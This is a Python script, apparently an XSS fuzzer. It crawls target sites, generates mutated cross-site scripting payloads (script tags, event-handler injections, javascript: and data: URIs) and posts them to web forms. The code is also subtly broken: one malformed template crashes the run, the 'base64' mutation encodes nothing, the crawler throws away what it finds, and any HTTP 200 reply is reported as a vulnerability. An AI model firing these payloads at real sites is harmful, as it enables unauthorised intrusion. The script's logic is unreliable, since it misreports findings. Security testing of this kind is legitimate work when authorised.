import requests
import random
import string
import time
import re
import json
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from collections import deque

# Define all active target URLs based on your ZAP data and manual review
TARGET_URLS = [
    "https://www.example.com",
    # Ensure all relevant URLs from your analysis are included
]

# AI-generated payload mutations
MUTATIONS = {
    'replace_quotes': lambda s: s.replace('"', "'"),
    'add_slash': lambda s: s.replace('>', '>/'),
    'use_html_entities': lambda s: s.replace('<', '&lt;').replace('>', '&gt;'),
    'base64_encode': lambda s: s.encode('utf-8').decode('utf-8').replace('=', '%3D'),
    'unicode_escape': lambda s: s.encode('unicode_escape').decode('utf-8'),
    'hex_encode': lambda s: ''.join([f'\\x{ord(c):02x}' for c in s]),
    'reverse_string': lambda s: s[::-1],
    'shuffle_string': lambda s: ''.join(random.sample(s, len(s))),
    'insert_random_chars': lambda s: ''.join([c + random.choice(string.ascii_letters) for c in s]),
    'remove_random_chars': lambda s: ''.join([c for i, c in enumerate(s) if i % 2 == 0]),
}

# AI-generated payload templates
TEMPLATES = [
    "<script>alert('{payload}');</script>",
    "<img src=x onerror={payload}>",
    "<svg/onload={payload}>",
    "<img src='x' onerror={payload}>",
    "<script>{payload}</script>",
    "<body onafterprint={payload}>",
    "<svg><animatetransform onbegin={payload}>",
    "<math><maction actiontype='statusline' xlink:href={payload}>CLICKME</maction></math>",
    "<iframe srcdoc='<svg><script>parent.{payload}</script>'></iframe>",
    "<keygen autofocus onfocus={payload}>",
    "javascript:\"/*'/*`/*--></title></style>*/<svg onload={payload}>//",
    "<img src=\"javascript:{payload};\">",
    "<div style='background:url(\"javascript:{payload}\")'>",
    "<style>@import 'data:text/css,*%7bx:expression({payload})%7D';</style>",
    "<script src=data:text/javascript,{payload}></script>",
    "<script type=\"text/javascript\">{payload};</script>",
    "<noscript><p title=\"</noscript><script>{payload}</script>\">",
    "<embed src=\"http://example.com/xss.swf\" allowscriptaccess=\"always\">",
    "<script>document.domain='example.com'; {payload};</script>",
    "\";{payload];//",
    "eval(location.hash.slice(1))",
]

# AI-generated payload generator
def generate_payload(template, mutation_count=5):
    payload = template.format(payload="XSS")
    for _ in range(mutation_count):
        mutation = random.choice(list(MUTATIONS.keys()))
        payload = MUTATIONS[mutation](payload)
    return payload

# AI-generated URL crawler
def crawl_url(session, url, max_depth=5):
    visited = set()
    queue = deque([(url, 0)])
    while queue:
        current_url, depth = queue.popleft()
        if current_url in visited or depth > max_depth:
            continue
        visited.add(current_url)
        try:
            response = session.get(current_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('/'):
                    href = urljoin(current_url, href)
                queue.append((href, depth + 1))
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {current_url}: {str(e)}")

# AI-generated vulnerability scanner
def scan_url(session, url):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for script in soup.find_all('script', src=True):
            src = script['src']
            if src.startswith('/'):
                src = urljoin(url, src)
            try:
                script_response = session.get(src, timeout=10)
                if script_response.status_code == 200:
                    print(f"Potential script injection at {url}: {src}")
            except requests.exceptions.RequestException as e:
                print(f"Request failed for {src}: {str(e)}")
        for form in soup.find_all('form'):
            action = form.get('action')
            if action:
                if action.startswith('/'):
                    action = urljoin(url, action)
                try:
                    form_response = session.post(action, data={"test_input": "XSS"}, timeout=10)
                    if form_response.status_code == 200:
                        print(f"Potential form injection at {url}: {action}")
                except requests.exceptions.RequestException as e:
                    print(f"Request failed for {action}: {str(e)}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed for {url}: {str(e)}")

# AI-generated XSS scanner
def scan_xss(session, url, payloads):
    for payload in payloads:
        try:
            response = session.post(url, data={"test_input": payload}, timeout=10)
            if response.status_code == 200:
                print(f"Potential XSS at {url} with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending payload to {url}: {str(e)}")

# Main function
def main():
    session = requests.Session()
    for url in TARGET_URLS:
        crawl_url(session, url)
        scan_url(session, url)
        payloads = [generate_payload(template) for template in TEMPLATES]
        scan_xss(session, url, payloads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Interrupted by user")
